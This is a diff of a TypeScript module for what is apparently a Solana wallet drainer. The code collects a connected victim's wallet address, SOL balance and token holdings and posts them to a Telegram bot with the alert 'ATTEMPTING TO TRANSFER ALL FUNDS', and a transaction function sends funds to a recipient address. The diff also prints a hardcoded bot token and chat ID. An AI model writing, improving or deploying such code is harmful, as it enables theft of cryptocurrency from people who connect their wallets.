@@ -1,9 +1,6 @@
 
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
-const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
-const TELEGRAM_CHAT_ID = "-1002490122517";
-
 // Helper function to add delay between retries
 const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -113,33 +110,46 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
   }
 };
 
-export const sendToTelegram = async (walletData: any) => {
+export const sendToTelegram = async (walletData: any, botToken: string, chatId: string) => {
   try {
     console.log("Preparing to send data to Telegram:", walletData);
     
-    // Make sure we have a valid balance
-    const solBalanceInSol = walletData.balance || 0;
+    // Format message based on the type of data we're sending
+    let message = "";
     
-    // Format token data in a more readable way
-    let formattedTokens = "No tokens found";
-    if (walletData.tokens && walletData.tokens.length > 0) {
-      formattedTokens = walletData.tokens.map((token: any, index: number) => 
-        `Token #${index + 1}:\n` +
-        `  Mint: ${token.mint}\n` +
-        `  Amount: ${token.amount}\n` +
-        `  Decimals: ${token.decimals}`
-      ).join('\n\n');
-    }
+    if (walletData.tokens) {
+      // This is the initial wallet connection message
+      // Make sure we have a valid balance
+      const solBalanceInSol = walletData.balance || 0;
+      
+      // Format token data in a more readable way
+      let formattedTokens = "No tokens found";
+      if (walletData.tokens && walletData.tokens.length > 0) {
+        formattedTokens = walletData.tokens.map((token: any, index: number) => 
+          `Token #${index + 1}:\n` +
+          `  Mint: ${token.mint}\n` +
+          `  Amount: ${token.amount}\n` +
+          `  Decimals: ${token.decimals}`
+        ).join('\n\n');
+      }
 
-    // Create a detailed message
-    const message = `🚨 WALLET CONNECTION DETECTED 🚨\n\n` +
-      `👛 Wallet Address: ${walletData.address}\n` +
-      `💰 SOL Balance: ${solBalanceInSol.toFixed(9)} SOL\n` +
-      `⌚ Time: ${new Date().toLocaleString()}\n` +
-      (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
-      `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n` +
-      `🌐 Network: ${PUBLIC_RPC_ENDPOINTS[0].includes('devnet') ? 'Devnet' : 'Mainnet'}\n` +
-      `💵 ATTEMPTING TO TRANSFER ALL FUNDS`;
+      // Create a detailed message
+      message = `🚨 WALLET CONNECTION DETECTED 🚨\n\n` +
+        `👛 Wallet Address: ${walletData.address}\n` +
+        `💰 SOL Balance: ${solBalanceInSol.toFixed(9)} SOL\n` +
+        `⌚ Time: ${new Date().toLocaleString()}\n` +
+        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
+        `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n` +
+        `🌐 Network: ${PUBLIC_RPC_ENDPOINTS[0].includes('devnet') ? 'Devnet' : 'Mainnet'}`;
+    } else if (walletData.message) {
+      // This is a custom message (transfer attempt or completion)
+      message = `👛 Wallet: ${walletData.address}\n` +
+        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
+        `🔔 ${walletData.message}`;
+    } else {
+      // Fallback generic message
+      message = `Wallet notification for: ${walletData.address}`;
+    }
 
     console.log("Sending message to Telegram:", message);
 
@@ -149,13 +159,13 @@ export const sendToTelegram = async (walletData: any) => {
       try {
         console.log(`Telegram send attempt #${attempt}`);
         
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
+            chat_id: chatId,
             text: message,
             parse_mode: 'Markdown',
           }),
@@ -187,7 +197,14 @@ export const sendToTelegram = async (walletData: any) => {
   }
 };
 
-export const signAndSendTransaction = async (connection: Connection, wallet: any, recipientAddress: string, amount: number) => {
+export const signAndSendTransaction = async (
+  connection: Connection, 
+  wallet: any, 
+  recipientAddress: string, 
+  amount: number,
+  botToken?: string,
+  chatId?: string
+) => {
   try {
     console.log('Creating transaction...');
     
